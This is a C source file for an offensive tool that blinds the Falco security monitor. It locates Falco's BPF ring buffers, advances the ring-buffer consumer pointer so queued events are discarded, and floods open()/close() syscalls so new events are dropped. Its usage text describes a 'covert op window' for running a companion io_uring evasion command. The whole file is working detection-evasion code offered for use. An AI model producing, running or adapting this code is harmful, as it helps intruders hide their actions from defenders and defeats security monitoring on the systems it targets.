#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <signal.h>

#define BPF_ATTR_SZ(field) \
    (unsigned int)(offsetof(union bpf_attr, field) + sizeof(((union bpf_attr *)0)->field))

static int bpf_call(int cmd, union bpf_attr *a, unsigned int sz)
{
    return (int)syscall(__NR_bpf, cmd, a, sz);
}

typedef struct {
    uint32_t id;
    uint32_t max_entries;
    char     name[BPF_OBJ_NAME_LEN + 1];
} MapCandidate;

static int find_falco_ringbufs(MapCandidate *out, int maxn)
{
    uint32_t id = 0;
    int found = 0;

    for (;;) {
        union bpf_attr nx = {}; nx.start_id = id;
        if (bpf_call(BPF_MAP_GET_NEXT_ID, &nx, BPF_ATTR_SZ(next_id)) < 0) break;
        id = nx.next_id;

        union bpf_attr gfd = {}; gfd.map_id = id;
        int fd = bpf_call(BPF_MAP_GET_FD_BY_ID, &gfd, BPF_ATTR_SZ(map_id));
        if (fd < 0) continue;

        struct bpf_map_info info = {};
        union bpf_attr gi = {};
        gi.info.bpf_fd   = (uint32_t)fd;
        gi.info.info_len = sizeof(info);
        gi.info.info     = (uint64_t)(uintptr_t)&info;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &gi, BPF_ATTR_SZ(info));
        close(fd);

        int is_rb   = (info.type == BPF_MAP_TYPE_RINGBUF);
        int is_perf = (info.type == BPF_MAP_TYPE_PERF_EVENT_ARRAY
                    && info.max_entries >= 8);
        if (!is_rb && !is_perf) continue;

        char name[BPF_OBJ_NAME_LEN + 1];
        memcpy(name, info.name, BPF_OBJ_NAME_LEN);
        name[BPF_OBJ_NAME_LEN] = '\0';

        int is_falco_name = (strcasestr(name, "falco") || strcasestr(name, "scap")
                          || strcasestr(name, "event") || strcasestr(name, "ring")
                          || strcasestr(name, "ppm")   || !name[0]);

        if (!is_falco_name && !is_rb) continue;

        if (found < maxn) {
            out[found].id          = id;
            out[found].max_entries = info.max_entries;
            memcpy(out[found].name, name, sizeof(out[found].name));
            found++;
        }
    }
    return found;
}

static int try_consumer_reset(uint32_t map_id, uint32_t rb_bytes)
{
    union bpf_attr gfd = {}; gfd.map_id = map_id;
    int fd = bpf_call(BPF_MAP_GET_FD_BY_ID, &gfd, BPF_ATTR_SZ(map_id));
    if (fd < 0) {
        fprintf(stderr, "[!] map fd: %s\n", strerror(errno));
        return -1;
    }

    long page = sysconf(_SC_PAGESIZE);

    void *cons_page = mmap(NULL, (size_t)page, PROT_READ|PROT_WRITE,
                           MAP_SHARED, fd, 0);

    void *prod_page = mmap(NULL, (size_t)page, PROT_READ,
                           MAP_SHARED, fd, page);
    close(fd);

    if (cons_page == MAP_FAILED || prod_page == MAP_FAILED) {
        fprintf(stderr, "[!] mmap ringbuf pages: %s\n", strerror(errno));
        if (cons_page != MAP_FAILED) munmap(cons_page, (size_t)page);
        if (prod_page != MAP_FAILED) munmap(prod_page, (size_t)page);
        return -1;
    }

    uint64_t *consumer_pos = (uint64_t *)cons_page;
    uint64_t *producer_pos = (uint64_t *)prod_page;

    uint64_t prod = __atomic_load_n(producer_pos, __ATOMIC_ACQUIRE);
    uint64_t cons = __atomic_load_n(consumer_pos, __ATOMIC_ACQUIRE);
    fprintf(stderr, "[*] ringbuf map_id=%u  size=%u B  prod=0x%llx  cons=0x%llx  used=%llu B\n",
            map_id, rb_bytes,
            (unsigned long long)prod, (unsigned long long)cons,
            (unsigned long long)(prod - cons));

    __atomic_store_n(consumer_pos, prod, __ATOMIC_RELEASE);
    fprintf(stderr, "[+] consumer_pos advanced to prod=0x%llx - Falco event queue drained\n",
            (unsigned long long)prod);

    munmap(cons_page, (size_t)page);
    munmap(prod_page, (size_t)page);
    return 0;
}

static volatile sig_atomic_t g_stop = 0;

static void *flood_thread(void *arg)
{
    const char *path = (const char *)arg;
    long count = 0;

    while (!g_stop) {
        int fd = open(path, O_RDONLY);
        if (fd >= 0) close(fd);
        count++;
    }
    return (void *)count;
}

static void handler(int s) { (void)s; g_stop = 1; }

static void flood_start(int nthreads, const char *target_file,
                        pthread_t *tids, double seconds)
{
    signal(SIGALRM, handler);
    alarm((unsigned int)seconds);

    for (int i = 0; i < nthreads; i++)
        pthread_create(&tids[i], NULL, flood_thread, (void *)target_file);
}

static long flood_join(int nthreads, pthread_t *tids)
{
    long total = 0;
    for (int i = 0; i < nthreads; i++) {
        void *rv;
        pthread_join(tids[i], &rv);
        total += (long)rv;
    }
    return total;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s find                  find Falco ringbuf/perf maps (needs CAP_BPF)\n"
            "  %s drain  <map_id>       advance ringbuf consumer ptr (creates blind window)\n"
            "  %s flood  [threads] [s]  event storm: N threads * T seconds (default 8, 5s)\n"
            "                           storms open()+close() to fill Falco's event buffer\n"
            "  %s full   [threads] [s]  flood + drain combo (maximum effect)\n"
            "\nhow it works:\n"
            "  Falco's BPF probe uses BPF_MAP_TYPE_RINGBUF to pass events to userspace.\n"
            "  When the ringbuf is full, bpf_ringbuf_reserve() fails and the event is\n"
            "  permanently discarded. Falco logs 'N events dropped' but not which ones.\n"
            "\n"
            "  'drain' mmaps the ringbuf consumer pointer and advances it to the current\n"
            "  producer position, making Falco believe all events have been consumed.\n"
            "  New events written after the drain are delivered normally.\n"
            "\n"
            "  'flood' generates massive open()+close() noise to fill the ringbuf so\n"
            "  that events generated during the flood window are dropped.\n"
            "\n"
            "  combine with io_uring_falco for the covert op: io_uring generates zero\n"
            "  syscall events, so it succeeds even without the flood. Flood is useful\n"
            "  when you must use regular syscalls for part of the operation.\n"
            "\nrequires: CAP_BPF for 'find' and 'drain'; flood is unprivileged\n",
            argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "find") == 0) {
        MapCandidate maps[16];
        int n = find_falco_ringbufs(maps, 16);
        if (n == 0) {
            printf("[*] no Falco ringbuf/perf maps found (no CAP_BPF, or kernel module driver)\n");
            return 0;
        }
        for (int i = 0; i < n; i++)
            printf("  map_id=%-5u  size=%-10u  name=%s\n",
                   maps[i].id, maps[i].max_entries,
                   maps[i].name[0] ? maps[i].name : "(unnamed)");
        printf("[*] use '%s drain <map_id>' to advance consumer pointer\n", argv[0]);
        return 0;
    }

    if (strcmp(argv[1], "drain") == 0) {
        if (argc < 3) { fprintf(stderr, "drain: need <map_id>\n"); return 1; }
        uint32_t mid = (uint32_t)atoi(argv[2]);

        union bpf_attr gfd = {}; gfd.map_id = mid;
        int fd = bpf_call(BPF_MAP_GET_FD_BY_ID, &gfd, BPF_ATTR_SZ(map_id));
        if (fd < 0) { perror("map fd"); return 1; }
        struct bpf_map_info info = {};
        union bpf_attr gi = {};
        gi.info.bpf_fd = (uint32_t)fd; gi.info.info_len = sizeof(info);
        gi.info.info   = (uint64_t)(uintptr_t)&info;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &gi, BPF_ATTR_SZ(info));
        close(fd);

        return try_consumer_reset(mid, info.max_entries) < 0 ? 1 : 0;
    }

    if (strcmp(argv[1], "flood") == 0 || strcmp(argv[1], "full") == 0) {
        int nthreads = argc >= 3 ? atoi(argv[2]) : 8;
        double secs  = argc >= 4 ? atof(argv[3]) : 5.0;
        int do_drain = (strcmp(argv[1], "full") == 0);

        if (nthreads < 1) nthreads = 1;
        if (nthreads > 64) nthreads = 64;

        if (do_drain) {

            MapCandidate maps[16];
            int n = find_falco_ringbufs(maps, 16);
            for (int i = 0; i < n; i++) {
                fprintf(stderr, "[*] draining map_id=%u (%s)\n",
                        maps[i].id, maps[i].name[0] ? maps[i].name : "unnamed");
                try_consumer_reset(maps[i].id, maps[i].max_entries);
            }
        }

        fprintf(stderr, "[*] flooding with %d threads for %.1f seconds\n", nthreads, secs);
        fprintf(stderr, "[*] covert op window open - run your io_uring_falco command NOW\n");
        fprintf(stderr, "[*] stop flooding with Ctrl+C or wait for timer\n");

        pthread_t tids[64];
        flood_start(nthreads, "/proc/version", tids, secs);
        long total = flood_join(nthreads, tids);

        fprintf(stderr, "[+] flood done - %ld open()+close() iterations total\n", total);
        fprintf(stderr, "[*] check /var/log/falco.log for 'events dropped' count\n");
        return 0;
    }

    fprintf(stderr, "unknown: %s\n", argv[1]);
    return 1;
}
